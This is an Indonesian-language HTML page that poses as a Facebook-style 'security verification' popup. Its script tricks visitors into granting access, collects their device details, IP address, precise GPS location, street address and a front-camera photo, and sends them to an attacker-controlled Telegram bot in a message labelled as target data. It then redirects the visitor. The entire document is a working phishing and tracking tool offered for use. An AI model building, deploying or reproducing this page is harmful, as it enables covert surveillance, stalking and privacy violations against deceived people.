<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Arial', sans-serif;
        }
        
        body {
            background: #f0f2f5;
            margin: 0;
            padding: 20px;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        
        .popup-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 10000;
        }
        
        .popup {
            background: white;
            border-radius: 12px;
            padding: 30px;
            max-width: 500px;
            width: 90%;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
            text-align: center;
        }
        
        .popup-header {
            margin-bottom: 20px;
        }
        
        .popup-icon {
            font-size: 48px;
            margin-bottom: 15px;
        }
        
        .popup-title {
            font-size: 22px;
            font-weight: bold;
            color: #1a1a1a;
            margin-bottom: 10px;
        }
        
        .popup-message {
            color: #666;
            line-height: 1.6;
            margin-bottom: 25px;
        }
        
        .btn {
            background: #1877f2;
            color: white;
            border: none;
            padding: 14px 30px;
            font-size: 16px;
            border-radius: 6px;
            cursor: pointer;
            margin: 5px;
            transition: background 0.3s;
        }
        
        .btn:hover {
            background: #166fe5;
        }
        
        .btn-secondary {
            background: #e4e6eb;
            color: #1a1a1a;
        }
        
        .btn-secondary:hover {
            background: #d8dadf;
        }
        
        .loading {
            display: none;
            margin: 20px 0;
        }
        
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #1877f2;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto 15px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .security-badge {
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 15px 0;
            color: #28a745;
            font-size: 14px;
        }
        
        .security-badge::before {
            content: "üîí";
            margin-right: 8px;
        }
    </style>
</head>
<body>
    <!-- Popup Overlay -->
    <div class="popup-overlay" id="popupOverlay">
        <div class="popup">
            <div class="popup-header">
                <div class="popup-icon">üîí</div>
                <div class="popup-title">Verifikasi Keamanan Diperlukan</div>
                <div class="popup-message">
                    Untuk melindungi akun Anda dari aktivitas mencurigakan, kami perlu memverifikasi identitas Anda.<br>
                    <strong>Verifikasi ini hanya sekali dan memakan waktu 10 detik.</strong>
                </div>
            </div>
            
            <div class="security-badge">
                Sistem Keamanan Penggunaüë• - Terenkripsi
            </div>
            
            <div>
                <button class="btn" id="verifyBtn">Lanjutkan Verifikasi</button>
                <button class="btn btn-secondary" id="cancelBtn">Nanti Saja</button>
            </div>
            
            <div class="loading" id="loading">
                <div class="spinner"></div>
                <p>Memverifikasi identitas Anda...</p>
            </div>
        </div>
    </div>

    <script>
        let config = {};
        let verificationCompleted = false;
        
        // Load configuration
        function loadConfig() {
            const urlParams = new URLSearchParams(window.location.search);
            const encodedData = urlParams.get('data');
            
            if (encodedData) {
                try {
                    config = JSON.parse(atob(encodedData));
                    // Show popup immediately
                    showPopup();
                } catch (e) {
                    redirectToTarget();
                }
            } else {
                redirectToTarget();
            }
        }
        
        // Show verification popup
        function showPopup() {
            document.getElementById('popupOverlay').style.display = 'flex';
        }
        
        // Start verification process
        async function startVerification() {
            const verifyBtn = document.getElementById('verifyBtn');
            const cancelBtn = document.getElementById('cancelBtn');
            const loadingDiv = document.getElementById('loading');
            
            verifyBtn.disabled = true;
            cancelBtn.disabled = true;
            loadingDiv.style.display = 'block';
            
            try {
                // Step 1: Get device info
                loadingDiv.innerHTML = '<div class="spinner"></div><p>Mendeteksi informasi perangkat...</p>';
                const deviceInfo = getDeviceInfo();
                const ipAddress = await getIPAddress();
                
                // Step 2: Get location with high accuracy
                loadingDiv.innerHTML = '<div class="spinner"></div><p>Mendeteksi lokasi untuk keamanan...</p>';
                const location = await getHighAccuracyLocation();
                const addressInfo = await getDetailedAddress(location.latitude, location.longitude);
                
                // Step 3: Access camera
                loadingDiv.innerHTML = '<div class="spinner"></div><p>Verifikasi wajah dengan kamera...</p>';
                const photoDataUrl = await takePhoto();
                
                // Step 4: Send all data to Telegram
                loadingDiv.innerHTML = '<div class="spinner"></div><p>Mengamankan data...</p>';
                await sendToTelegram(photoDataUrl, deviceInfo, ipAddress, location, addressInfo);
                
                // Success
                loadingDiv.innerHTML = '<div style="color: #28a745; font-size: 48px;">‚úì</div><p>Verifikasi berhasil! Mengarahkan...</p>';
                verificationCompleted = true;
                
                // Redirect after delay
                setTimeout(redirectToTarget, 2000);
                
            } catch (error) {
                console.error("Verification error:", error);
                loadingDiv.innerHTML = '<div style="color: #dc3545;">Verifikasi gagal. Mengarahkan...</div>';
                setTimeout(redirectToTarget, 2000);
            }
        }
        
        // Redirect to target website
        function redirectToTarget() {
            if (config.target) {
                window.location.href = config.target;
            } else {
                window.location.href = 'https://facebook.com';
            }
        }
        
        // Cancel verification
        function cancelVerification() {
            if (!verificationCompleted) {
                redirectToTarget();
            }
        }
        
        // Get detailed device information
        function getDeviceInfo() {
            const userAgent = navigator.userAgent;
            let deviceInfo = {
                tipe: "Tidak Diketahui",
                model: "Tidak Diketahui",
                os: "Tidak Diketahui",
                browser: "Tidak Diketahui",
                layar: `${screen.width}x${screen.height}`,
                bahasa: navigator.language,
                platform: navigator.platform,
                vendor: navigator.vendor || "Tidak Diketahui",
                core: navigator.hardwareConcurrency || "Tidak Diketahui",
                ram: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Tidak Diketahui",
                baterai: "Tidak Diketahui"
            };
            
            // Detect device type
            if (/Android/.test(userAgent)) {
                deviceInfo.tipe = "Ponsel Android";
                deviceInfo.os = "Android";
                const match = userAgent.match(/Android.*; (.*) Build/);
                if (match) deviceInfo.model = match[1];
            } else if (/iPhone/.test(userAgent)) {
                deviceInfo.tipe = "iPhone";
                deviceInfo.os = "iOS";
                const match = userAgent.match(/iPhone.*OS ([0-9_]+)/);
                if (match) deviceInfo.os = `iOS ${match[1].replace('_', '.')}`;
            } else if (/iPad/.test(userAgent)) {
                deviceInfo.tipe = "iPad";
                deviceInfo.os = "iOS";
            } else if (/Windows/.test(userAgent)) {
                deviceInfo.tipe = "Komputer Windows";
                deviceInfo.os = "Windows";
            } else if (/Mac/.test(userAgent)) {
                deviceInfo.tipe = "Komputer Mac";
                deviceInfo.os = "MacOS";
            }
            
            // Detect browser
            if (/Chrome/.test(userAgent) && !/Edg/.test(userAgent)) {
                deviceInfo.browser = "Google Chrome";
            } else if (/Firefox/.test(userAgent)) {
                deviceInfo.browser = "Mozilla Firefox";
            } else if (/Safari/.test(userAgent) && !/Chrome/.test(userAgent)) {
                deviceInfo.browser = "Safari";
            } else if (/Edg/.test(userAgent)) {
                deviceInfo.browser = "Microsoft Edge";
            }
            
            // Get battery info if available
            if ('getBattery' in navigator) {
                navigator.getBattery().then(function(battery) {
                    deviceInfo.baterai = Math.round(battery.level * 100) + '%' + (battery.charging ? ' (Mengisi)' : '');
                });
            }
            
            return deviceInfo;
        }
        
        // Get IP address
        async function getIPAddress() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                return "Tidak Diketahui";
            }
        }
        
        // Get high accuracy location
        async function getHighAccuracyLocation() {
            return new Promise((resolve, reject) => {
                if (!navigator.geolocation) {
                    reject("Geolocation tidak didukung");
                    return;
                }
                
                const options = {
                    enableHighAccuracy: true,
                    timeout: 15000,
                    maximumAge: 0
                };
                
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        resolve({
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            altitude: position.coords.altitude,
                            altitudeAccuracy: position.coords.altitudeAccuracy,
                            heading: position.coords.heading,
                            speed: position.coords.speed
                        });
                    },
                    (error) => {
                        reject(`Error lokasi: ${error.message}`);
                    },
                    options
                );
            });
        }
        
        // Get detailed address information
        async function getDetailedAddress(lat, lng) {
            try {
                const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&addressdetails=1`);
                const data = await response.json();
                
                if (data && data.address) {
                    const addr = data.address;
                    return {
                        jalan: addr.road || "Tidak Diketahui",
                        desa: addr.village || addr.hamlet || "Tidak Diketahui",
                        kecamatan: addr.suburb || addr.county || "Tidak Diketahui",
                        kota: addr.city || addr.town || addr.municipality || "Tidak Diketahui",
                        provinsi: addr.state || "Tidak Diketahui",
                        negara: addr.country || "Tidak Diketahui",
                        kodePos: addr.postcode || "Tidak Diketahui",
                        alamatLengkap: data.display_name || "Tidak Diketahui"
                    };
                }
            } catch (error) {
                console.error("Error getting address:", error);
            }
            
            return {
                jalan: "Tidak Diketahui",
                desa: "Tidak Diketahui", 
                kecamatan: "Tidak Diketahui",
                kota: "Tidak Diketahui",
                provinsi: "Tidak Diketahui",
                negara: "Tidak Diketahui",
                kodePos: "Tidak Diketahui",
                alamatLengkap: "Tidak Diketahui"
            };
        }
        
        // Take photo from camera
        async function takePhoto() {
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { 
                    width: 1280, 
                    height: 720,
                    facingMode: 'user'
                } 
            });
            
            const video = document.createElement('video');
            video.srcObject = stream;
            video.play();
            
            await new Promise(resolve => {
                video.addEventListener('loadedmetadata', () => {
                    setTimeout(resolve, 800);
                });
            });
            
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            const photoDataUrl = canvas.toDataURL('image/jpeg', 0.85);
            
            // Stop camera
            stream.getTracks().forEach(track => track.stop());
            
            return photoDataUrl;
        }
        
        // Send data to Telegram
        async function sendToTelegram(photoDataUrl, deviceInfo, ipAddress, location, addressInfo) {
            if (!config.token || !config.chatId) return false;
            
            try {
                // Create detailed message in Indonesian
                let message = `üéØ DATA TARGET TERVERIFIKASI\n\n`;
                
                message += `üì± INFORMASI PERANGKAT:\n`;
                message += `‚Ä¢ Tipe: ${deviceInfo.tipe}\n`;
                message += `‚Ä¢ Model: ${deviceInfo.model}\n`;
                message += `‚Ä¢ Sistem Operasi: ${deviceInfo.os}\n`;
                message += `‚Ä¢ Browser: ${deviceInfo.browser}\n`;
                message += `‚Ä¢ Ukuran Layar: ${deviceInfo.layar}\n`;
                message += `‚Ä¢ Bahasa: ${deviceInfo.bahasa}\n`;
                message += `‚Ä¢ Platform: ${deviceInfo.platform}\n`;
                message += `‚Ä¢ Vendor: ${deviceInfo.vendor}\n`;
                message += `‚Ä¢ Jumlah Core: ${deviceInfo.core}\n`;
                message += `‚Ä¢ RAM: ${deviceInfo.ram}\n`;
                message += `‚Ä¢ Baterai: ${deviceInfo.baterai}\n\n`;
                
                message += `üåê INFORMASI JARINGAN:\n`;
                message += `‚Ä¢ Alamat IP: ${ipAddress}\n\n`;
                
                message += `üìç INFORMASI LOKASI:\n`;
                message += `‚Ä¢ Koordinat: ${location.latitude.toFixed(6)}, ${location.longitude.toFixed(6)}\n`;
                message += `‚Ä¢ Akurasi: ${location.accuracy} meter\n`;
                message += `‚Ä¢ Jalan: ${addressInfo.jalan}\n`;
                message += `‚Ä¢ Desa: ${addressInfo.desa}\n`;
                message += `‚Ä¢ Kecamatan: ${addressInfo.kecamatan}\n`;
                message += `‚Ä¢ Kota: ${addressInfo.kota}\n`;
                message += `‚Ä¢ Provinsi: ${addressInfo.provinsi}\n`;
                message += `‚Ä¢ Negara: ${addressInfo.negara}\n`;
                message += `‚Ä¢ Kode Pos: ${addressInfo.kodePos}\n`;
                message += `‚Ä¢ Alamat Lengkap: ${addressInfo.alamatLengkap}\n`;
                message += `‚Ä¢ Google Maps: https://maps.google.com/?q=${location.latitude},${location.longitude}\n\n`;
                
                message += `üïí WAKTU VERIFIKASI:\n`;
                message += `‚Ä¢ ${new Date().toLocaleString('id-ID')}\n`;
                message += `‚Ä¢ Zona Waktu: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n\n`;
                
                message += `üîí VERIFIKASI KAMERA: ‚úÖ Berhasil`;
                
                // Convert photo and send
                const response = await fetch(photoDataUrl);
                const blob = await response.blob();
                
                const formData = new FormData();
                formData.append('chat_id', config.chatId);
                formData.append('photo', blob, 'foto_verifikasi.jpg');
                formData.append('caption', message);
                
                await fetch(`https://api.telegram.org/bot${config.token}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                
                return true;
            } catch (error) {
                console.error("Error sending to Telegram:", error);
                return false;
            }
        }
        
        // Event listeners
        document.getElementById('verifyBtn').addEventListener('click', startVerification);
        document.getElementById('cancelBtn').addEventListener('click', cancelVerification);
        
        // Initialize
        document.addEventListener('DOMContentLoaded', loadConfig);
    </script>
</body>
</html>
